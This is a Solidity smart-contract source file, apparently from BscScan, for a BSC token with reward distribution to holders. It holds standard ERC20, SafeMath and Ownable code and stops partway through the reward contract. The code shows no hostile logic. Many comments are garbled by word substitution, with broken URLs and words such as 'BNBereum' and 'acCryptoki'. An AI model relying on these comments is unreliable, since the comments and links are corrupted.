/**
 *Submitted for verification at BscScan.com on 2021-11-25
*/

/**
 *Submitted for verification at BscScan.com on 2021-11-25
*/

//SPDX-License-Identifier: MIT


	interface IERC20 {
	   
		function totalSupply() external view returns (uint256);
		function balanceOf(address account) external view returns (uint256);
		function transfer(address recipient, uint256 amount) external returns (bool);
		function allowance(address owner, address spender) external view returns (uint256);
		function approve(address spender, uint256 amount) external returns (bool);
		function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
		event Transfer(address indexed from, address indexed to, uint256 value);
		event Approval(address indexed owner, address indexed spender, uint256 value);
	}
	abstract contract Context {
		function _msgSender() internal view virtual returns (address payable) {
			return msg.sender;
		}

		function _msgData() internal view virtual returns (bytes memory) {
			this; // silence state mutability warning without generating bytecode - see https://github.com/BNBereum/solidity/issues/2691
			return msg.data;
		}
	}

	pragma solidity >=0.6.2;

	interface IuniswapV2Router01 {
		function factory() external pure returns (address);
		function WETH() external pure returns (address);

		function addLiquidity(
			address tokenA,
			address tokenB,
			uint amountADesired,
			uint amountBDesired,
			uint amountAMin,
			uint amountBMin,
			address to,
			uint deadline
		) external returns (uint amountA, uint amountB, uint liquidity);
		function addLiquidityBNB(
			address token,
			uint amountTokenDesired,
			uint amountTokenMin,
			uint amountBNBMin,
			address to,
			uint deadline
		) external payable returns (uint amountToken, uint amountBNB, uint liquidity);
		function removeLiquidity(
			address tokenA,
			address tokenB,
			uint liquidity,
			uint amountAMin,
			uint amountBMin,
			address to,
			uint deadline
		) external returns (uint amountA, uint amountB);
		function removeLiquidityBNB(
			address token,
			uint liquidity,
			uint amountTokenMin,
			uint amountBNBMin,
			address to,
			uint deadline
		) external returns (uint amountToken, uint amountBNB);
		function removeLiquidityWithPermit(
			address tokenA,
			address tokenB,
			uint liquidity,
			uint amountAMin,
			uint amountBMin,
			address to,
			uint deadline,
			bool approveMax, uint8 v, bytes32 r, bytes32 s
		) external returns (uint amountA, uint amountB);
		function removeLiquidityBNBWithPermit(
			address token,
			uint liquidity,
			uint amountTokenMin,
			uint amountBNBMin,
			address to,
			uint deadline,
			bool approveMax, uint8 v, bytes32 r, bytes32 s
		) external returns (uint amountToken, uint amountBNB);
		function swapExactTokensForTokens(
			uint amountIn,
			uint amountOutMin,
			address[] calldata path,
			address to,
			uint deadline
		) external returns (uint[] memory amounts);
		function swapTokensForExactTokens(
			uint amountOut,
			uint amountInMax,
			address[] calldata path,
			address to,
			uint deadline
		) external returns (uint[] memory amounts);
		function swapExactBNBForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
			external
			payable
			returns (uint[] memory amounts);
		function swapTokensForExactBNB(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
			external
			returns (uint[] memory amounts);
		function swapExactTokensForBNB(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
			external
			returns (uint[] memory amounts);
		function swapBNBForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
			external
			payable
			returns (uint[] memory amounts);

		function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
		function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
		function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
		function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
		function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
	}
	// File: contracts/IuniswapV2Router02.sol

	pragma solidity >=0.6.2;


	interface IuniswapV2Router02 is IuniswapV2Router01 {
		function removeLiquidityBNBSupportingFeeOnTransferTokens(
			address token,
			uint liquidity,
			uint amountTokenMin,
			uint amountBNBMin,
			address to,
			uint deadline
		) external returns (uint amountBNB);
		function removeLiquidityBNBWithPermitSupportingFeeOnTransferTokens(
			address token,
			uint liquidity,
			uint amountTokenMin,
			uint amountBNBMin,
			address to,
			uint deadline,
			bool approveMax, uint8 v, bytes32 r, bytes32 s
		) external returns (uint amountBNB);

		function swapExactTokensForTokensSupportingFeeOnTransferTokens(
			uint amountIn,
			uint amountOutMin,
			address[] calldata path,
			address to,
			uint deadline
		) external;
		function swapExactBNBForTokensSupportingFeeOnTransferTokens(
			uint amountOutMin,
			address[] calldata path,
			address to,
			uint deadline
		) external payable;
		function swapExactTokensForBNBSupportingFeeOnTransferTokens(
			uint amountIn,
			uint amountOutMin,
			address[] calldata path,
			address to,
			uint deadline
		) external;
	}
	// File: contracts/IuniswapV2Factory.sol

	pragma solidity >=0.5.0;

	interface IuniswapV2Factory {
		event PairCreated(address indexed token0, address indexed token1, address pair, uint);

		function feeTo() external view returns (address);
		function feeToSetter() external view returns (address);

		function getPair(address tokenA, address tokenB) external view returns (address pair);
		function allPairs(uint) external view returns (address pair);
		function allPairsLength() external view returns (uint);

		function createPair(address tokenA, address tokenB) external returns (address pair);

		function setFeeTo(address) external;
		function setFeeToSetter(address) external;
	}
	// File: contracts/IuniswapV2Pair.sol

	pragma solidity >=0.5.0;

	interface IuniswapV2Pair {
		event Approval(address indexed owner, address indexed spender, uint value);
		event Transfer(address indexed from, address indexed to, uint value);

		function name() external pure returns (string memory);
		function symbol() external pure returns (string memory);
		function decimals() external pure returns (uint8);
		function totalSupply() external view returns (uint);
		function balanceOf(address owner) external view returns (uint);
		function allowance(address owner, address spender) external view returns (uint);

		function approve(address spender, uint value) external returns (bool);
		function transfer(address to, uint value) external returns (bool);
		function transferFrom(address from, address to, uint value) external returns (bool);

		function DOMAIN_SEPARATOR() external view returns (bytes32);
		function PERMIT_TYPEHASH() external pure returns (bytes32);
		function nonces(address owner) external view returns (uint);

		function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;

		event Mint(address indexed sender, uint amount0, uint amount1);
		event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);
		event Swap(
			address indexed sender,
			uint amount0In,
			uint amount1In,
			uint amount0Out,
			uint amount1Out,
			address indexed to
		);
		event Sync(uint112 reserve0, uint112 reserve1);

		function MINIMUM_LIQUIDITY() external pure returns (uint);
		function factory() external view returns (address);
		function token0() external view returns (address);
		function token1() external view returns (address);
		function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
		function price0CumulativeLast() external view returns (uint);
		function price1CumulativeLast() external view returns (uint);
		function kLast() external view returns (uint);

		function mint(address to) external returns (uint liquidity);
		function burn(address to) external returns (uint amount0, uint amount1);
		function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
		function skim(address to) external;
		function sync() external;

		function initialize(address, address) external;
	}
	// File: contracts/NFTMapping.sol

	// 
	pragma solidity ^0.7.0;

	library NFTMapping {
		// Iterable mapping from address to uint;
		struct Map {
			address[] keys;
			mapping(address => uint) values;
			mapping(address => uint) indexOf;
			mapping(address => bool) inserted;
		}

		function get(Map storage map, address key) public view returns (uint) {
			return map.values[key];
		}

		function getIndexOfKey(Map storage map, address key) public view returns (int) {
			if(!map.inserted[key]) {
				return -1;
			}
			return int(map.indexOf[key]);
		}

		function getKeyAtIndex(Map storage map, uint index) public view returns (address) {
			return map.keys[index];
		}



		function size(Map storage map) public view returns (uint) {
			return map.keys.length;
		}

		function set(Map storage map, address key, uint val) public {
			if (map.inserted[key]) {
				map.values[key] = val;
			} else {
				map.inserted[key] = true;
				map.values[key] = val;
				map.indexOf[key] = map.keys.length;
				map.keys.push(key);
			}
		}

		function remove(Map storage map, address key) public {
			if (!map.inserted[key]) {
				return;
			}

			delete map.inserted[key];
			delete map.values[key];

			uint index = map.indexOf[key];
			uint lastIndex = map.keys.length - 1;
			address lastKey = map.keys[lastIndex];

			map.indexOf[lastKey] = index;
			delete map.indexOf[key];

			map.keys[index] = lastKey;
			map.keys.pop();
		}
	}
	// File: contracts/Ownable.sol

	// 

	pragma solidity ^0.7.0;

	/**
	 * @dev Contract module which provides a basic access control mechanism, where
	 * there is an account (an owner) that can be granted exclusive access to
	 * specific functions.
	 *
	 * By default, the owner account will be the one that deploys the contract. This
	 * can later be changed with {transferOwnership}.
	 *
	 * This module is used through inheritance. It will make available the modifier
	 * `onlyOwner`, which can be applied to your functions to restrict their use to
	 * the owner.
	 */
	abstract contract Ownable is Context {
		address private _owner;

		event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

		/**
		 * @dev Initializes the contract setting the deployer as the initial owner.
		 */
		constructor () {
			address msgSender = _msgSender();
			_owner = msgSender;
			emit OwnershipTransferred(address(0), msgSender);
		}

		/**
		 * @dev Returns the address of the current owner.
		 */
		function owner() public view virtual returns (address) {
			return _owner;
		}

		/**
		 * @dev Throws if called by any account other than the owner.
		 */
		modifier onlyOwner() {
			require(owner() == _msgSender(), "Ownable: caller is not the owner");
			_;
		}

		/**
		 * @dev Leaves the contract without owner. It will not be possible to call
		 * `onlyOwner` functions anymore. Can only be called by the current owner.
		 *
		 * NOTE: Renouncing ownership will leave the contract without an owner,
		 * thereby removing any functionality that is only available to the owner.
		 */
		function renounceOwnership() public virtual onlyOwner {
			emit OwnershipTransferred(_owner, address(0));
			_owner = address(0);
		}

		/**
		 * @dev Transfers ownership of the contract to a new account (`newOwner`).
		 * Can only be called by the current owner.
		 */
		function transferOwnership(address newOwner) public virtual onlyOwner {
			require(newOwner != address(0), "Ownable: new owner is the zero address");
			emit OwnershipTransferred(_owner, newOwner);
			_owner = newOwner;
		}
	}
	// File: contracts/INFTPayingTokenOptional.sol

	pragma solidity 0.7.0;


	/// @title NFT-Paying Token Optional Interface
	/// @author Roger Wu (https://github.com/roger-wu)
	/// @dev OPTIONAL functions for a NFT-paying token contract.
	interface INFTPayingTokenOptional {
	  /// @notice View the amount of NFT in wei that an address can withdraw.
	  /// @param _owner The address of a token holder.
	  /// @return The amount of NFT in wei that `_owner` can withdraw.
	  function withdrawableNFTOf(address _owner) external view returns(uint256);

	  /// @notice View the amount of NFT in wei that an address has withdrawn.
	  /// @param _owner The address of a token holder.
	  /// @return The amount of NFT in wei that `_owner` has withdrawn.
	  function withdrawnNFTOf(address _owner) external view returns(uint256);

	  /// @notice View the amount of NFT in wei that an address has earned in total.
	  /// @dev accumulativeNFTOf(_owner) = withdrawableNFTOf(_owner) + withdrawnNFTOf(_owner)
	  /// @param _owner The address of a token holder.
	  /// @return The amount of NFT in wei that `_owner` has earned in total.
	  function accumulativeNFTOf(address _owner) external view returns(uint256);
	}
	// File: contracts/INFTPayingToken.sol

	pragma solidity ^0.7.0;


	/// @title NFT-Paying Token Interface
	/// @author Roger Wu (https://github.com/roger-wu)
	/// @dev An interface for a NFT-paying token contract.
	interface INFTPayingToken {
	  /// @notice View the amount of NFT in wei that an address can withdraw.
	  /// @param _owner The address of a token holder.
	  /// @return The amount of NFT in wei that `_owner` can withdraw.
	  function NFTOf(address _owner) external view returns(uint256);

	  /// @notice Distributes BNBer to token holders as NFTs.
	  /// @dev SHOULD distribute the paid BNBer to token holders as NFTs.
	  ///  SHOULD NOT directly transfer BNBer to token holders in this function.
	  ///  MUST emit a `NFTsDistributed` event when the amount of distributed BNBer is greater than 0.
	  function distributeNFTs() external payable;

	  /// @notice Withdraws the BNBer distributed to the sender.
	  /// @dev SHOULD transfer `NFTOf(msg.sender)` wei to `msg.sender`, and `NFTOf(msg.sender)` SHOULD be 0 after the transfer.
	  ///  MUST emit a `NFTWithdrawn` event if the amount of BNBer transferred is greater than 0.
	  function withdrawNFT() external;

	  /// @dev This event MUST emit when BNBer is distributed to token holders.
	  /// @param from The address which sends BNBer to this contract.
	  /// @param weiAmount The amount of distributed BNBer in wei.
	  event NFTsDistributed(
		address indexed from,
		uint256 weiAmount
	  );

	  /// @dev This event MUST emit when an address withdraws their NFT.
	  /// @param to The address which withdraws BNBer from this contract.
	  /// @param weiAmount The amount of withdrawn BNBer in wei.
	  event NFTWithdrawn(
		address indexed to,
		uint256 weiAmount
	  );
	}
	// File: contracts/SafeMathInt.sol

	pragma solidity ^0.7.0;


	/**
	 * @title SafeMathInt
	 * @dev Math operations with safety checks that revert on error
	 * @dev SafeMath AUpted for int256
	 * Based on code of  https://github.com/RequestNetwork/requestNetwork/blob/master/packages/requestNetworkSmartContracts/contracts/base/math/SafeMathInt.sol
	 */
	library SafeMathInt {
	  function mul(int256 a, int256 b) internal pure returns (int256) {
		// Prevent overflow when multiplying INT256_MIN with -1
		// https://github.com/RequestNetwork/requestNetwork/issues/43
		require(!(a == - 2**255 && b == -1) && !(b == - 2**255 && a == -1));

		int256 c = a * b;
		require((b == 0) || (c / b == a));
		return c;
	  }

	  function div(int256 a, int256 b) internal pure returns (int256) {
		// Prevent overflow when dividing INT256_MIN by -1
		// https://github.com/RequestNetwork/requestNetwork/issues/43
		require(!(a == - 2**255 && b == -1) && (b > 0));

		return a / b;
	  }

	  function sub(int256 a, int256 b) internal pure returns (int256) {
		require((b >= 0 && a - b <= a) || (b < 0 && a - b > a));

		return a - b;
	  }

	  function add(int256 a, int256 b) internal pure returns (int256) {
		int256 c = a + b;
		require((b >= 0 && c >= a) || (b < 0 && c < a));
		return c;
	  }

	  function toUint256Safe(int256 a) internal pure returns (uint256) {
		require(a >= 0);
		return uint256(a);
	  }
	}
	// File: contracts/SafeMathUint.sol

	pragma solidity ^0.7.0;


	/**
	 * @title SafeMathUint
	 * @dev Math operations with safety checks that revert on error
	 */
	library SafeMathUint {
	  function toInt256Safe(uint256 a) internal pure returns (int256) {
		int256 b = int256(a);
		require(b >= 0);
		return b;
	  }
	}

	// File: contracts/ERC20.sol

	// 

	pragma solidity ^0.7.0;


	/**
	 * @dev Implementation of the {IERC20} interface.
	 *
	 * This implementation is agnostic to the way tokens are created. This means
	 * that a supply mechanism has to be added in a derived contract using {_mint}.
	 * For a generic mechanism see {ERC20PresetMinterPauser}.
	 *
	 * TIP: For a detailed writeup see our guide
	 * https://forum.zeppelin.solutions/t/how-to-implement-erc20-supply-mechanisms/226[How
	 * to implement supply mechanisms].
	 *
	 * We have followed general OpenZeppelin guidelines: functions revert instead
	 * of returning `false` on failure. This behavior is nonBNBeless conventional
	 * and does not conflict with the expectations of ERC20 applications.
	 *
	 * Additionally, an {Approval} event is emitted on calls to {transferFrom}.
	 * This allows applications to reconstruct the allowance for all acCryptoki just
	 * by listening to said events. Other implementations of the EIP may not emit
	 * these events, as it isn't required by the specification.
	 *
	 * Finally, the non-standard {decreaseAllowance} and {increaseAllowance}
	 * functions have been added to mitigate the well-known issues around setting
	 * allowances. See {IERC20-approve}.
	 */
	contract ERC20 is Context, IERC20 {
		using SafeMath for uint256;

		mapping (address => uint256) private _balances;

		mapping (address => mapping (address => uint256)) private _allowances;

		uint256 private _totalSupply;

		string private _name;
		string private _symbol;
		uint8 private _decimals;

		/**
		 * @dev Sets the values for {name} and {symbol}, initializes {decimals} with
		 * a default value of 18.
		 *
		 * To select a different value for {decimals}, use {_setupDecimals}.
		 *
		 * All three of these values are immutable: they can only be set once during
		 * construction.
		 */
		constructor (string memory name_, string memory symbol_) {
			_name = name_;
			_symbol = symbol_;
			_decimals = 18;
		}

		/**
		 * @dev Returns the name of the token.
		 */
		function name() public view virtual returns (string memory) {
			return _name;
		}

		/**
		 * @dev Returns the symbol of the token, usually a shorter version of the
		 * name.
		 */
		function symbol() public view virtual returns (string memory) {
			return _symbol;
		}

		/**
		 * @dev Returns the number of decimals used to get its user representation.
		 * For example, if `decimals` equals `2`, a balance of `505` tokens should
		 * be displayed to a user as `5,05` (`505 / 10 ** 2`).
		 *
		 * Tokens usually opt for a value of 18, imitating the relationship between
		 * BNBer and Wei. This is the value {ERC20} uses, unless {_setupDecimals} is
		 * called.
		 *
		 * NOTE: This information is only used for _display_ purposes: it in
		 * no way affects any of the arithmetic of the contract, including
		 * {IERC20-balanceOf} and {IERC20-transfer}.
		 */
		function decimals() public view virtual returns (uint8) {
			return _decimals;
		}

		/**
		 * @dev See {IERC20-totalSupply}.
		 */
		function totalSupply() public view virtual override returns (uint256) {
			return _totalSupply;
		}

		/**
		 * @dev See {IERC20-balanceOf}.
		 */
		function balanceOf(address account) public view virtual override returns (uint256) {
			return _balances[account];
		}

		/**
		 * @dev See {IERC20-transfer}.
		 *
		 * Requirements:
		 *
		 * - `recipient` cannot be the zero address.
		 * - the caller must have a balance of at least `amount`.
		 */
		function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
			_transfer(_msgSender(), recipient, amount);
			return true;
		}

		/**
		 * @dev See {IERC20-allowance}.
		 */
		function allowance(address owner, address spender) public view virtual override returns (uint256) {
			return _allowances[owner][spender];
		}

		/**
		 * @dev See {IERC20-approve}.
		 *
		 * Requirements:
		 *
		 * - `spender` cannot be the zero address.
		 */
		function approve(address spender, uint256 amount) public virtual override returns (bool) {
			_approve(_msgSender(), spender, amount);
			return true;
		}

		/**
		 * @dev See {IERC20-transferFrom}.
		 *
		 * Emits an {Approval} event indicating the updated allowance. This is not
		 * required by the EIP. See the note at the beginning of {ERC20}.
		 *
		 * Requirements:
		 *
		 * - `sender` and `recipient` cannot be the zero address.
		 * - `sender` must have a balance of at least `amount`.
		 * - the caller must have allowance for ``sender``'s tokens of at least
		 * `amount`.
		 */
		function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
			_transfer(sender, recipient, amount);
			_approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
			return true;
		}

		/**
		 * @dev Atomically increases the allowance granted to `spender` by the caller.
		 *
		 * This is an alternative to {approve} that can be used as a mitigation for
		 * problems described in {IERC20-approve}.
		 *
		 * Emits an {Approval} event indicating the updated allowance.
		 *
		 * Requirements:
		 *
		 * - `spender` cannot be the zero address.
		 */
		function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
			_approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
			return true;
		}

		/**
		 * @dev Atomically decreases the allowance granted to `spender` by the caller.
		 *
		 * This is an alternative to {approve} that can be used as a mitigation for
		 * problems described in {IERC20-approve}.
		 *
		 * Emits an {Approval} event indicating the updated allowance.
		 *
		 * Requirements:
		 *
		 * - `spender` cannot be the zero address.
		 * - `spender` must have allowance for the caller of at least
		 * `subtractedValue`.
		 */
		function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
			_approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
			return true;
		}

		/**
		 * @dev Moves tokens `amount` from `sender` to `recipient`.
		 *
		 * This is internal function is equivalent to {transfer}, and can be used to
		 * e.g. implement autoBNB token fees, slashing mechanisms, etc.
		 *
		 * Emits a {Transfer} event.
		 *
		 * Requirements:
		 *
		 * - `sender` cannot be the zero address.
		 * - `recipient` cannot be the zero address.
		 * - `sender` must have a balance of at least `amount`.
		 */
		function _transfer(address sender, address recipient, uint256 amount) internal virtual {
			require(sender != address(0), "ERC20: transfer from the zero address");
			require(recipient != address(0), "ERC20: transfer to the zero address");

			_beforeTokenTransfer(sender, recipient, amount);

			_balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
			_balances[recipient] = _balances[recipient].add(amount);
			emit Transfer(sender, recipient, amount);
		}

		/** @dev Creates `amount` tokens and assigns them to `account`, increasing
		 * the total supply.
		 *
		 * Emits a {Transfer} event with `from` set to the zero address.
		 *
		 * Requirements:
		 *
		 * - `to` cannot be the zero address.
		 */
		function _mint(address account, uint256 amount) internal virtual {
			require(account != address(0), "ERC20: mint to the zero address");

			_beforeTokenTransfer(address(0), account, amount);

			_totalSupply = _totalSupply.add(amount);
			_balances[account] = _balances[account].add(amount);
			emit Transfer(address(0), account, amount);
		}

		/**
		 * @dev Destroys `amount` tokens from `account`, reducing the
		 * total supply.
		 *
		 * Emits a {Transfer} event with `to` set to the zero address.
		 *
		 * Requirements:
		 *
		 * - `account` cannot be the zero address.
		 * - `account` must have at least `amount` tokens.
		 */
		function _burn(address account, uint256 amount) internal virtual {
			require(account != address(0), "ERC20: burn from the zero address");

			_beforeTokenTransfer(account, address(0), amount);

			_balances[account] = _balances[account].sub(amount, "ERC20: burn amount exceeds balance");
			_totalSupply = _totalSupply.sub(amount);
			emit Transfer(account, address(0), amount);
		}

		/**
		 * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.
		 *
		 * This internal function is equivalent to `approve`, and can be used to
		 * e.g. set autoBNB allowances for certain subsystems, etc.
		 *
		 * Emits an {Approval} event.
		 *
		 * Requirements:
		 *
		 * - `owner` cannot be the zero address.
		 * - `spender` cannot be the zero address.
		 */
		function _approve(address owner, address spender, uint256 amount) internal virtual {
			require(owner != address(0), "ERC20: approve from the zero address");
			require(spender != address(0), "ERC20: approve to the zero address");

			_allowances[owner][spender] = amount;
			emit Approval(owner, spender, amount);
		}

		/**
		 * @dev Sets {decimals} to a value other than the default one of 18.
		 *
		 * WARNING: This function should only be called from the constructor. Most
		 * applications that interact with token contracts will not expect
		 * {decimals} to ever change, and may work incorrectly if it does.
		 */
		function _setupDecimals(uint8 decimals_) internal virtual {
			_decimals = decimals_;
		}

		/**
		 * @dev Hook that is called before any transfer of tokens. This includes
		 * minting and burning.
		 *
		 * Calling conditions:
		 *
		 * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens
		 * will be to transferred to `to`.
		 * - when `from` is zero, `amount` tokens will be minted for `to`.
		 * - when `to` is zero, `amount` of ``from``'s tokens will be burned.
		 * - `from` and `to` are never both zero.
		 *
		 * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
		 */
		function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual { }
	}
	// File: contracts/SafeMath.sol

	// 

	pragma solidity ^0.7.0;

	/**
	 * @dev Wrappers over Solidity's arithmetic operations with added overflow
	 * checks.
	 *
	 * Arithmetic operations in Solidity wrap on overflow. This can easily result
	 * in bugs, because programmers usually assume that an overflow raises an
	 * error, which is the standard behavior in high level programming languages.
	 * `SafeMath` restores this intuition by reverting the transaction when an
	 * operation overflows.
	 *
	 * Using this library instead of the unchecked operations eliminates an entire
	 * class of bugs, so it's recommended to use it always.
	 */
	library SafeMath {
		/**
		 * @dev Returns the addition of two unsigned integers, with an overflow flag.
		 *
		 * _Available since v3.4._
		 */
		function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
			uint256 c = a + b;
			if (c < a) return (false, 0);
			return (true, c);
		}

		/**
		 * @dev Returns the substraction of two unsigned integers, with an overflow flag.
		 *
		 * _Available since v3.4._
		 */
		function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
			if (b > a) return (false, 0);
			return (true, a - b);
		}

		/**
		 * @dev Returns the multiplication of two unsigned integers, with an overflow flag.
		 *
		 * _Available since v3.4._
		 */
		function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
			// Gas optimization: this is cheaper than requiring 'a' not being zero, but the
			// benefit is lost if 'b' is also Cryptokied.
			// See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
			if (a == 0) return (true, 0);
			uint256 c = a * b;
			if (c / a != b) return (false, 0);
			return (true, c);
		}

		/**
		 * @dev Returns the division of two unsigned integers, with a division by zero flag.
		 *
		 * _Available since v3.4._
		 */
		function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
			if (b == 0) return (false, 0);
			return (true, a / b);
		}

		/**
		 * @dev Returns the remainder of dividing two unsigned integers, with a division by zero flag.
		 *
		 * _Available since v3.4._
		 */
		function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
			if (b == 0) return (false, 0);
			return (true, a % b);
		}

		/**
		 * @dev Returns the addition of two unsigned integers, reverting on
		 * overflow.
		 *
		 * Counterpart to Solidity's `+` operator.
		 *
		 * Requirements:
		 *
		 * - Addition cannot overflow.
		 */
		function add(uint256 a, uint256 b) internal pure returns (uint256) {
			uint256 c = a + b;
			require(c >= a, "SafeMath: addition overflow");
			return c;
		}

		/**
		 * @dev Returns the subtraction of two unsigned integers, reverting on
		 * overflow (when the result is negative).
		 *
		 * Counterpart to Solidity's `-` operator.
		 *
		 * Requirements:
		 *
		 * - Subtraction cannot overflow.
		 */
		function sub(uint256 a, uint256 b) internal pure returns (uint256) {
			require(b <= a, "SafeMath: subtraction overflow");
			return a - b;
		}

		/**
		 * @dev Returns the multiplication of two unsigned integers, reverting on
		 * overflow.
		 *
		 * Counterpart to Solidity's `*` operator.
		 *
		 * Requirements:
		 *
		 * - Multiplication cannot overflow.
		 */
		function mul(uint256 a, uint256 b) internal pure returns (uint256) {
			if (a == 0) return 0;
			uint256 c = a * b;
			require(c / a == b, "SafeMath: multiplication overflow");
			return c;
		}

		/**
		 * @dev Returns the integer division of two unsigned integers, reverting on
		 * division by zero. The result is rounded towards zero.
		 *
		 * Counterpart to Solidity's `/` operator. Note: this function uses a
		 * `revert` opcode (which leaves remaining gas untouched) while Solidity
		 * uses an invalid opcode to revert (consuming all remaining gas).
		 *
		 * Requirements:
		 *
		 * - The divisor cannot be zero.
		 */
		function div(uint256 a, uint256 b) internal pure returns (uint256) {
			require(b > 0, "SafeMath: division by zero");
			return a / b;
		}

		/**
		 * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
		 * reverting when dividing by zero.
		 *
		 * Counterpart to Solidity's `%` operator. This function uses a `revert`
		 * opcode (which leaves remaining gas untouched) while Solidity uses an
		 * invalid opcode to revert (consuming all remaining gas).
		 *
		 * Requirements:
		 *
		 * - The divisor cannot be zero.
		 */
		function mod(uint256 a, uint256 b) internal pure returns (uint256) {
			require(b > 0, "SafeMath: modulo by zero");
			return a % b;
		}

		/**
		 * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
		 * overflow (when the result is negative).
		 *
		 * CAUTION: This function is deprecated because it requires allocating memory for the error
		 * message unnecessarily. For custom revert reasons use {trySub}.
		 *
		 * Counterpart to Solidity's `-` operator.
		 *
		 * Requirements:
		 *
		 * - Subtraction cannot overflow.
		 */
		function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
			require(b <= a, errorMessage);
			return a - b;
		}

		/**
		 * @dev Returns the integer division of two unsigned integers, reverting with custom message on
		 * division by zero. The result is rounded towards zero.
		 *
		 * CAUTION: This function is deprecated because it requires allocating memory for the error
		 * message unnecessarily. For custom revert reasons use {tryDiv}.
		 *
		 * Counterpart to Solidity's `/` operator. Note: this function uses a
		 * `revert` opcode (which leaves remaining gas untouched) while Solidity
		 * uses an invalid opcode to revert (consuming all remaining gas).
		 *
		 * Requirements:
		 *
		 * - The divisor cannot be zero.
		 */
		function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
			require(b > 0, errorMessage);
			return a / b;
		}

		/**
		 * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
		 * reverting with custom message when dividing by zero.
		 *
		 * CAUTION: This function is deprecated because it requires allocating memory for the error
		 * message unnecessarily. For custom revert reasons use {tryMod}.
		 *
		 * Counterpart to Solidity's `%` operator. This function uses a `revert`
		 * opcode (which leaves remaining gas untouched) while Solidity uses an
		 * invalid opcode to revert (consuming all remaining gas).
		 *
		 * Requirements:
		 *
		 * - The divisor cannot be zero.
		 */
		function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
			require(b > 0, errorMessage);
			return a % b;
		}
	}

	// File: contracts/CryptokiNFTPayingToken.sol

	// 

	pragma solidity ^0.7.0;










	/// @title NFT-Paying Token
	/// @author Roger Wu (https://github.com/roger-wu)
	/// @dev A mintable ERC20 token that allows anyone to pay and distribute BNBer
	///  to token holders as NFTs and allows token holders to withdraw their NFTs.
	///  Reference: the source code of PoWH3D: https://BNBerscan.io/address/0xB3775fB83F7D12A36E0475aBdD1FCA35c091efBe#code
	contract NFTPayingToken is ERC20, INFTPayingToken, INFTPayingTokenOptional {
	  using SafeMath for uint256;
	  using SafeMathUint for uint256;
	  using SafeMathInt for int256;

	  // With `magnitude`, we can properly distribute NFTs even if the amount of received BNBer is small.
	  // For more discussion about choosing the value of `magnitude`,
	  //  see https://github.com/BNBereum/EIPs/issues/17.6#issuecomment-472352728
	  uint256 constant internal magnitude = 2**128;

	  uint256 internal magnifiedNFTPerShare;
	  uint256 internal lastAmount;
	  
	  address public immutable BNB = address(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);

	  // About NFTCorrection:
	  // If the token balance of a `_user` is never changed, the NFT of `_user` can be computed with:
	  //   `NFTOf(_user) = NFTPerShare * balanceOf(_user)`.
	  // When `balanceOf(_user)` is changed (via minting/burning/transferring tokens),
	  //   `NFTOf(_user)` should not be changed,
	  //   but the computed value of `NFTPerShare * balanceOf(_user)` is changed.
	  // To keep the `NFTOf(_user)` unchanged, we add a correction term:
	  //   `NFTOf(_user) = NFTPerShare * balanceOf(_user) + NFTCorrectionOf(_user)`,
	  //   where `NFTCorrectionOf(_user)` is updated whenever `balanceOf(_user)` is changed:
	  //   `NFTCorrectionOf(_user) = NFTPerShare * (old balanceOf(_user)) - (new balanceOf(_user))`.
	  // So now `NFTOf(_user)` returns the same value before and after `balanceOf(_user)` is changed.
	  mapping(address => int256) internal magnifiedNFTCorrections;
	  mapping(address => uint256) internal withdrawnNFTs;

	  uint256 public totalNFTsDistributed;

	  constructor(string memory _name, string memory _symbol) ERC20(_name, _symbol){

	  }
	  

	  receive() external payable {
	  }

	  /// @notice Distributes BNBer to token holders as NFTs.
	  /// @dev It reverts if the total supply of tokens is 0.
	  /// It emits the `NFTsDistributed` event if the amount of received BNBer is greater than 0.
	  /// About undistributed BNBer:
	  ///   In each distribution, there is a small amount of BNBer not distributed,
	  ///     the magnified amount of which is
	  ///     `(msg.value * magnitude) % totalSupply()`.
	  ///   With a well-chosen `magnitude`, the amount of undistributed BNBer
	  ///     (de-magnified) in a distribution can be less than 1 wei.
